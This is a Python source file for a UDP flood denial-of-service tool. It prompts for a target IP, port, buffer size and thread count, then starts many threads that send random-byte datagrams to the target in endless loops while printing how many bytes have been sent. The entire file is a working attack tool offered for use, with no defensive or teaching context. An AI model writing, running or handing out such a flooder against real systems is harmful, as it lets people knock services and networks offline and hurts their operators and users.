import sys
from threading import Thread
import socket
from typing import *
import random


class Main:
    def __init__(self, infos: List[Union[str, int]]) -> None:
        self.target: tuple = (infos[0], infos[1])
        self.buffer_size: int = infos[2]
        self.thread_count: int = infos[3]
        self.sent_bytes: int = 0

        self.client: socket.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.bytes_to_send: list = [self.__generate_random_bytes() for _ in range(self.thread_count)]

    def start_dos(self) -> None:
        Thread(target=self.stat_printer).start()
        for _, idx in enumerate(range(self.thread_count)):
            Thread(target=self.send, args=(idx,)).start()

    def stat_printer(self) -> None:
        while True:
            sys.stdout.write(f"\rSent {self.sent_bytes} bytes to {self.target[0]}:{self.target[1]} "
                             f"({self.sent_bytes / 1_000_000_000} GB)")
            sys.stdout.flush()

    def send(self, bytes_pos: int) -> None:
        while True:
            self.client.sendto(self.bytes_to_send[bytes_pos], self.target)
            self.sent_bytes += self.buffer_size

    def __generate_random_bytes(self) -> bytes:
        return bytes(random.randint(0, 255) for _ in range(self.buffer_size))


def get_input(prompt: str, expected_type: str, allow_null: bool = False) -> Union[int, str]:
    answer: str = input(prompt)
    if expected_type == 'int':
        if allow_null and len(answer) == 0:
            return 0
        if not answer.isdigit() and len(answer) > 0:
            print("Must be a number.")
            exit()
        return int(answer)
    elif expected_type == 'str':
        if allow_null and len(answer) == 0:
            return ''

        if len(answer) == 0:
            print("Must be a string.")
            exit()
        return answer


def get_infos() -> List[Union[str, int]]:
    return [get_input('Enter target IP: ', 'str'),
            get_input('Enter target port (default is random): ', 'int', allow_null=True),
            get_input('Enter buffer size (default is 1024): ', 'int', allow_null=True),
            get_input('Enter number of threads (default is 100): ', 'int', allow_null=True)]


if __name__ == '__main__':
    tmp_infos: List[Union[str, int]] = get_infos()
    # make port random if not specified
    if tmp_infos[1] == 0:
        tmp_infos[1] = random.randint(1, 65535)
    if tmp_infos[2] == 0:
        tmp_infos[2] = 1024
    if tmp_infos[3] == 0:
        tmp_infos[3] = 100

    main: Main = Main(infos=tmp_infos)
    main.start_dos()
